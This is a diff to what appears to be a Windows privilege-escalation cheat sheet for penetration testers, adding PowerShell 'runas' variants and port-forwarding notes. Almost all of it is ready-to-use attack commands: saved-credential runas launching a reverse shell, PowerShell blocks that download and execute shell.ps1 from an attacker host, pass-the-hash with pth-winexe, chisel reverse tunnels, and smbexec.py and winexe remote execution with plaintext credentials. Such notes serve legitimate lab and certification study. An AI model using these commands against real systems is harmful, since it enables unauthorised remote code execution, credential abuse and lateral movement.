@@ -186,22 +186,33 @@ pth-winexe -U 'domain\admin%LM:NTLM' [--system] //10.10.10.10 cmd.exe
 ``` powershell
 # cmd
 runas /savecred /user:admin C:\abcd\reverse.exe
-# PowerShell
+
+# PowerShell Runas 1
 $password = ConvertTo-SecureString 'pass123' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
 Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://kali_ip/shell.ps1')" -Credential $cred
+
+# PowerShell Runas 2
+$username = "domain\Administrator"
+$password = "pass123"
+$secstr = New-Object -TypeName System.Security.SecureString
+$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
+Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/shell.ps1') } -Credential $cred -Computer localhost
 ```
 ## Port Forwarding 
 ``` powershell
 # If some port are listening on the target machine but inaccessible, forward the ports - Port Forwarding
-# winexe, pth-winexe works on 445, MySQL on 3306
+# winexe, pth-winexe, smbexec.py, psexec works on 445, MySQL on 3306
 # On KALI
 ./chisel server --reverse --port 9001
 # On Windows
 .\chisel.exe client KALI_IP:9001 R:KALI_PORT:127.0.0.1:WINDOWS_PORT
+# Example --> .\chisel.exe client KALI_IP:9001 R:445:127.0.0.1:445
 
 # On KALI
-winexe -U 'administrator%pass123' --system //127.0.0.1 KALI_PORT 
+winexe -U 'administrator%pass123' --system //127.0.0.1 KALI_PORT
+smbexec.py domain/username:password@127.0.0.1 
 mysql --host=127.0.0.1 --port=KALI_PORT -u username -p
 ```
 ## Exploit suggester
